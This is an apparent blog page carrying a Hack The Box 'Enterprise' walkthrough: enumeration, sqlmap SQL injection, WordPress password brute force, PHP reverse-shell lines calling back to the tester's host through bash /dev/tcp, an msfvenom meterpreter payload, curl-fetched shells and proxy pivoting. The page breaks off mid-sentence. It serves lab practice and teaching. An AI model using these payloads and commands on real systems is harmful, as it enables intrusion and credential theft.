@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Enterprise Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="This Writeup is about Enterprise, on hack the box. It starts off with a SQLInjection. Dump a database find passwords login to Wordpress and get a shell.">
+    <link rel="canonical" href="https://sheerazali.com/blog/enterprise-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Enterprise Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="This Writeup is about Enterprise, on hack the box. It starts off with a SQLInjection. Dump a database find passwords login to Wordpress and get a shell.">
+    <meta property="og:url" content="https://sheerazali.com/blog/enterprise-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2020/04/BLOG-THUMBNAILS.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2020-04-11T08:19:29.000Z">
+    <meta property="article:modified_time" content="2021-05-24T04:35:15.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Enterprise Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="This Writeup is about Enterprise, on hack the box. It starts off with a SQLInjection. Dump a database find passwords login to Wordpress and get a shell.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/enterprise-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2020/04/BLOG-THUMBNAILS.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Enterprise Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/enterprise-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2020-04-11T08:19:29.000Z",
+    "dateModified": "2021-05-24T04:35:15.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2020/04/BLOG-THUMBNAILS.png?fit=1920%2C1080&ssl=1",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "This Writeup is about Enterprise, on hack the box. It starts off with a SQLInjection. Dump a database find passwords login to Wordpress and get a shell.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/enterprise-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">April 11, 2020</span>
+        <span class="reading-time">16 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Enterprise Writeup / Walkthrough Hack the box">Enterprise Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2020/04/BLOG-THUMBNAILS.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1" alt="Enterprise Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Enterprise Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h2 id="enterprise-writeup">Enterprise Writeup</h2><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_enterprise.png" class="kg-image" alt="Enterprise writeup htb" loading="lazy" width="599" height="387"><figcaption>Enterprise Write up Hack the box</figcaption></figure><h2 id="tldr">TL;DR</h2><p>This Writeup is about <a href="//www.hackthebox.eu/home/machines/profile/112" rel="noreferrer noopener">Enterprise</a>, on hack the box. It was a Linux box. It starts off with a SQLInjection for an initial foothold. We dump a database find passwords login to WordPress and get a shell. There we find we are in a docker network. So we port forward a host and get connected to database dump usernames in Joomla database. We use passwords found earlier to login and get a shell on this server there we get access to /files folder which is mounted from the host so we host a reverse shell. There and get a shell on the host from there we find out a SUID vulnerable to buffer Overflow so we exploit it and get root. That is it for Enterprise Writeup.</p><h2 id="walkthrough">Walkthrough</h2><h2 id="scanning-network">Scanning Network</h2><p>I did an initial Nmap scan and there was a lot of output. From there we found that port 22, 80, 443 &amp; 8080 were open. So I started enumeration and found that port 80 had WordPress. Port 443 an apache server &amp; port 8080 had a Joomla instance running so I started enumeration.</p><pre><code class="language-bash">Nmap 7.80 scan initiated Tue Apr  7 22:09:13 2020 as: nmap -sC -sV -oA nmap/10.10.10.61 10.10.10.61
+Nmap scan report for 10.10.10.61
+Host is up (0.32s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
+80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: USS Enterprise – Ships Log
+443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
+|_http-server-header: Apache/2.4.25 (Ubuntu)
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+| Not valid before: 2017-08-25T10:35:14
+|_Not valid after:  2017-09-24T10:35:14
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: Joomla! - Open Source Content Management
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h2 id="enumeration-and-reconnaissance">Enumeration and Reconnaissance.</h2><p>This machine had a lot to enumerate. So I used Wpscan for WordPress from this we find that there are no useful vulnerabilities. Just a couple of XSS and CSRF to get an initial foothold. We need an RCE or something similar to let us in so I ignored it and moved ahead.</p><pre><code class="language-bash">wpscan --url http://enterprise.local -e vp vt cb u m --api-token 9USW6KxqY91d7DXaNtDxawBRFqepm1pO1xKyNUsNa8gs | tee wpscan.log
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.8
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://enterprise.local/
+[+] Started: Thu Apr  9 08:45:32 2020
+
+Interesting Finding(s):
+
+[+] http://enterprise.local/
+ | Interesting Entries:
+ |  - Server: Apache/2.4.10 (Debian)
+ |  - X-Powered-By: PHP/5.6.31
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+[+] http://enterprise.local/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+[+] http://enterprise.local/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+</code></pre><p>This is just to show what options I used. There were a lot of vulnerabilities but they weren’t useful you can see the <a href="//pastebin.com/KJNUt1BB" rel="noreferrer noopener">whole dump on paste bin</a>.</p><p>Also, I found a user named William.riker and username convention they are using by going through there posts on WordPress.</p><p>Moving on I started gobuster on port 443 and found files directory. I manually searched and found a username in SSL certificate. In which I found an email address so I saved it in case we find passwords. We can try to ssh in with this username.</p><pre><code class="language-bash">root@kali:~ gobuster dir -u https://10.10.10.61 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -t 50 -o root.gobust -k
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            https://10.10.10.61
+[+] Threads:        50
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/04/09 09:14:01 Starting gobuster
+===============================================================
+/files (Status: 301)</code></pre><p>I used a -k option to ignore certificate checks by gobuster or it’ll fail to brute force the directories. We found out that domain is enterprise.local and email is jeanlupicard@enterpise.local this information was in SSL certificate. To check it you need to go to https://10.10.10.61. I have made an entry in my host file for enterprise.local and enterprise.htb to point to 10.10.10.61 IP. You can do it too by this one-liner.</p><pre><code class="language-bash">echo "10.10.10.61  enterprise.local enterprise.htb" &gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2020_04_ssl.png" class="kg-image" alt loading="lazy" width="552" height="514"></figure><p>Moving on to Joomla for enumeration, I used a tool called Joomlavs. I Found a SQL Injection. For now, I left it alone for a while you can see the<a href="//pastebin.com/Qvt2skCb" rel="noreferrer noopener"> whole dump on Pastebin.</a></p><h2 id="enterprise-writeup-source-code-review-on-lcarszip">Enterprise Writeup: Source Code Review on lcars.zip</h2><p>I went back and browsed to https://enterpise.local/files directory that we found earlier when we were gobusting port 443.</p><p>I found a zip file called lcars.zip I unzipped it. It looked like a WordPress plugin. This zip file had two files PHP files both are taking input from the “Query” parameter. And passing it to a SQL Query to the database without sanitization. Although one of these looked like broken PHP code lcars_db.php was just a rabbit hole. Another file lcars_dbpost.php was doing the same but it was only allowing numbers in user input.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_sq.png" class="kg-image" alt="Enterprise writeup htb" loading="lazy" width="629" height="507"><figcaption>Only Int are getting passed to sql query</figcaption></figure><p>So i went on WordPress and tried the URL <strong>http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1</strong> and it worked that means that our WordPress is vulnerable to SQL injection and lcars.zip is on this instance.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_sqsq-1.png" class="kg-image" alt="Enterprise writeup htb" loading="lazy" width="1068" height="450"><figcaption>Sql injection detected</figcaption></figure><p>So i used SQLMap to exploit this first i open burp and captured this request. I saved it in a file by right click &gt; copy to file in burp.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_saq.png" class="kg-image" alt="copy to file" loading="lazy" width="762" height="589"><figcaption>Save to file burp</figcaption></figure><p>I tried SQLMap with couple of other settings but this one worked the best for me.</p><pre><code class="language-bash">root@kali: sqlmap -r lcarss.req -p query --dbms mysql --risk 1 --level 1                                 
+        __
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.4.1#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:07:42 /2020-04-09/
+
+[10:07:42] [INFO] parsing HTTP request from 'lcarss.req'
+[10:07:45] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: query (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: query=(SELECT (CASE WHEN (2853=2853) THEN 1 ELSE (SELECT 1307 UNION SELECT 2863) END))
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: query=1 AND (SELECT 4231 FROM(SELECT COUNT(*),CONCAT(0x716b626271,(SELECT (ELT(4231=4231,1))),0x716b7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: query=1 AND (SELECT 5529 FROM (SELECT(SLEEP(5)))oQkF)
+---
+[10:07:47] [INFO] testing MySQL
+[10:07:47] [INFO] confirming MySQL
+[10:07:47] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8.0 (jessie)
+web application technology: PHP 5.6.31, Apache 2.4.10
+back-end DBMS: MySQL &gt;= 5.0.0
+[10:07:47] [INFO] fetched data logged to text files under '/root/.sqlmap/output/enterprise.htb'
+
+[*] ending @ 10:07:47 /2020-04-09/</code></pre><p>after this, I used SQLMaps –dump parameter to dump the database. Found posts in WordPress posts that had passwords in them another had to store passwords quickly. So he left them there.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_passwords.png" class="kg-image" alt="passwords enterprise" loading="lazy" width="1365" height="155"><figcaption>SQLMap dump Passwords in post</figcaption></figure><p>I saved these passwords in a file called passwords. Used wpscan to bruteforce WordPress. See if any of these passwords belong to William.riker the user we found earlier. And found a valid pair.</p><pre><code class="language-bash"> wpscan --url http://enterprise.local --usernames william.riker --passwords /root/Desktop/HackTheBox-Machines/Enterprise/passwords 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+_______________________________________________________________
+
+[+] URL: http://enterprise.local/
+[+] Started: Thu Apr  9 10:22:11 2020
+
+Interesting Finding(s):
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - william.riker / u*Z14ru0p#ttj83zS6                                                                                                                                                  
+Trying william.riker / nZD3YxfnSjezg67JZ Time: 00:00:00 &lt;=================================&gt; (5 / 5) 100.00% Time: 00:00:00
+
+[i] Valid Combinations Found:
+ | Username: william.riker, Password: u*Z14ru0p#ttj83zS6
+
+[+] Finished: Thu Apr  9 10:22:29 2020
+[+] Requests Done: 51
+[+] Cached Requests: 4
+[+] Data Sent: 13.956 KB
+[+] Data Received: 138.54 KB
+[+] Memory used: 156.952 MB
+[+] Elapsed time: 00:00:17
+</code></pre><h2 id="enterprise-writeup-initial-foothold">Enterprise Writeup: Initial Foothold</h2><p>Now I logged in WordPress as William.riker and I found that I could edit theme so I added my malicious PHP code to get a shell in header.php file. Since it is a challenge it doesn’t matter but if it were a real pentest putting it on header ill give you a shell but it’ll hang the webserver this can raise suspicion avoid doing this in a real-world scenario.</p><pre><code class="language-php">&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.16/9999 0&gt;&amp;1'");?&gt;</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_rce.png" class="kg-image" alt="initial foothold enterprise" loading="lazy" width="1281" height="524"><figcaption>Getting a shell</figcaption></figure><p>And we got a shell. I did if config and it was not found so i tried ip addr and found that this machine had different ip address that 10.10.10.61 which we were attacking this made me think that it might be container i tried ip neighbors to see if there is 10.10.10.61 around but it was not in our network.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_shell.png" class="kg-image" alt="Initial foothold enterprise" loading="lazy" width="770" height="250"><figcaption>Different IP</figcaption></figure><p>On checking our network neighbors. I saw 172.17.0.2 this IP address as 172.17.0.1 is probably the gateway 172.17.0.2 is another host. So I checked /etc/hosts file for a clue on what it might be and we find out that it is a Mysql server.</p><pre><code class="language-bash">www-data@b8319d86d21e:/var/www/html$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1 localhost
+::1 localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.2 mysql 15af95635b7d
+172.17.0.4 b8319d86d21e</code></pre><p>It also suggests that these hostnames are generated which may be an indication that this is a docker container.</p><p>As we got a shell through WordPress I wanted to check what is there in wp-config.php to get database password in it. I got MySQL root password in wp-config.php.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_dbpass.png" class="kg-image" alt loading="lazy" width="587" height="234"><figcaption>Root password of database in wp-config.php</figcaption></figure><p>Because we couldn’t get a good pty shell as there was no python on this box Ill upgrade our shell to a meterpreter shell.</p><pre><code class="language-bash">root@kali:msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=8001 -f elf -o msf.bin 
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: msf.bin
+root@kali: python -m SimpleHTTPServer -p 80</code></pre><p>Hosted this file on python server in my machine. then I used curl to download meterpreter payload on our target &amp; execute it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_metasploit-meterpreter-shell.png" class="kg-image" alt loading="lazy" width="1361" height="598"><figcaption>Upgrading to Meterpreter Shell</figcaption></figure><h2 id="enterprise-writeup-pivoting-to-access-database-on-1721702">Enterprise Writeup: Pivoting to access database on 172.17.0.2</h2><p>Now that we have a meterpreter shell ill try to port forward MySQL port so that we can access it on localhost and see what’s in the database we could have just done –dump-all option of SQLMap but I want to show pivoting.</p><p>Ill use meterpreter to start a socks4 server so that we can talk to 172.17.0.0.</p><p>Step 1:  Background Meterpreter session by background command and use sock4 auxiliary to start a server note that its listening on port 1080 so you have to set up the same port number in your /etc/proxychains.conf.</p><pre><code class="language-bash">meterpreter &gt; background
+[*] Backgrounding session 4...
+msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) &gt; show options
+Module options (auxiliary/server/socks4a):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  
+
+msf5 auxiliary(server/socks4a) &gt; route add 172.17.0.0/24 4
+[*] Route added
+msf5 auxiliary(server/socks4a) &gt; run
+[*] Auxiliary module running as background job 0.
+msf5 auxiliary(server/socks4a) &gt; 
+[*] Starting the socks4a proxy server</code></pre><p>Check Proxychains have setup on port 1080.</p><pre><code class="language-bash">root@kali: tail /etc/proxychains.conf
+#	  	
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4 	127.0.0.1 1080</code></pre><p>On last line of proxychains conf, you can see socks4 host and port is localhost and port 1080. If yours don’t match change it to the same. Using vim /etc/proxychains.conf goto last line and change the port to 1080.</p><p>Now ill open another terminal on my kali and use proxychains to navigate to that host and connect to MYSQL. Use the password we found in wp-config.php and we are in the database.</p><pre><code class="language-bash">root@kali: proxychains mysql -u root -p -h 172.17.0.2            
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password: 
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.17.0.2:3306-&lt;&gt;&lt;&gt;-OK
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 55
+Server version: 5.7.19 MySQL Community Server (GPL)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]&gt; </code></pre><p>In this database I found joomladb and in Joomla, i found two more usernames. I have not shown how I selected the table and fields but check out this <a href="//pastebin.com/7410W1EQ" rel="noreferrer noopener">Pastebin dump</a>. If you wanna know how I got to know table names and databases. also, check out this <a href="//gist.github.com/hofmannsven/9164408" rel="noreferrer noopener">cheatsheet.</a></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_joomla-passwords.png" class="kg-image" alt loading="lazy" width="750" height="167"><figcaption>Joomladb password hash’s</figcaption></figure><p>Instead of cracking these hash’s I instead tried the passwords we found earlier in WordPress DB. And <strong>geordi.la.forge:ZD3YxfnSjezg67JZ </strong>credential pair worked for SuperUser account.</p><h2 id="enterprise-writeup-joomla-to-shell">Enterprise Writeup: Joomla To Shell</h2><p>I’ll edit the template on joomla to get a shell-like we did on WordPress. Well, use the same payload and edit index.php file in this template. You can find templates under <strong>“Extensions &gt; Templates &gt; Templates &gt; Protostar Details and Files”</strong>.</p><pre><code class="language-php">exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.16/9002 0&gt;&amp;1'");</code></pre><p>And we get a shell on port 9002 when loading our joomla home page. But after there is nothing special about it. Except that joomla have a files directory which had lcars.zip. I also checked mount points and found. That there is some weird mounting points that points to /var/www/html on both joomla &amp; wordpress.</p><pre><code class="language-bash">www-data@a7018bfdc454:/var/www/html$ mount
+
+# these are the weird mounting points 
+
+/dev/mapper/enterprise--vg-root on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /var/www/html type ext4 (rw,relatime,errors=remount-ro,data=ordered)\
+
+# this is where it is pointing to /var/www/sheerazali.com/files 
+
+/dev/mapper/enterprise--vg-root on /var/www/sheerazali.com/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+
+www-data@a7018bfdc454:/var/www/html$ 
+</code></pre><p>PS:- I have removed the rest of the mount points. Now I’ll host another PHP file in files directory and see if we get to the host. Ill use the Pentester monkeys PHP reverse shell-like earlier host it on my machine and curl it on server</p><pre><code class="language-bash">www-data@a7018bfdc454:/var/www/sheerazali.com/files$ curl http://10.10.14.16/shell.php -o shell.php</code></pre><p>we navigate on our browser to shell.php And we got a shell from host.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_shell-1.png" class="kg-image" alt loading="lazy" width="659" height="260"><figcaption>Shell from enterprise.htb</figcaption></figure><p>After a lot of work we got user on this box.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_user.txt.png" class="kg-image" alt loading="lazy" width="615" height="418"><figcaption>Userflag</figcaption></figure><h2 id="enterprise-writeup-re">Enterprise Writeup: RE</h2><p>After running linenum on the host machine. I found lcars SUID file it looked like a possible way to escalate our privileges on this box. So I base64ed it and copied the file to my kali. If you don’t know about this method of coping files than look at my <a href="https://sheerazali.com/postman-writeup-walkthrough-hack-the-box/" rel="noreferrer noopener">postman </a>writeup where I copied ssh key using this technique.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2020_04_strcmp.png" class="kg-image" alt loading="lazy" width="737" height="407"></figure><p>It Asks for the key when we try to run it. so i did ltrace on this binary and there is a 